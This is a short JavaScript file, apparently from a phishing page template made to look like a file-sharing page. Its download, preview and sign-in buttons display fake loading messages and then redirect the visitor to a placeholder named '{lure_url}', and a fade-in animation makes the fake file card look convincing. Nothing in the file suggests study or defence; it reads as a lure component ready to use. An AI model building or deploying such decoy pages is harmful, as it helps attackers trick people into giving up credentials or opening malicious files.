function downloadFile() {
    const btn = document.querySelector('.btn-download-primary');
    btn.innerHTML = '<span>Preparing download...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1500);
}

function previewFile() {
    const btn = document.querySelector('.btn-preview');
    btn.innerHTML = '<span>Loading preview...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1200);
}

function signIn() {
    window.location.href = '{lure_url}';
}

document.addEventListener('DOMContentLoaded', () => {
    const card = document.querySelector('.file-preview-card');
    card.style.opacity = '0';
    card.style.transform = 'scale(0.95)';
    
    setTimeout(() => {
        card.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
        card.style.opacity = '1';
        card.style.transform = 'scale(1)';
    }, 200);
});
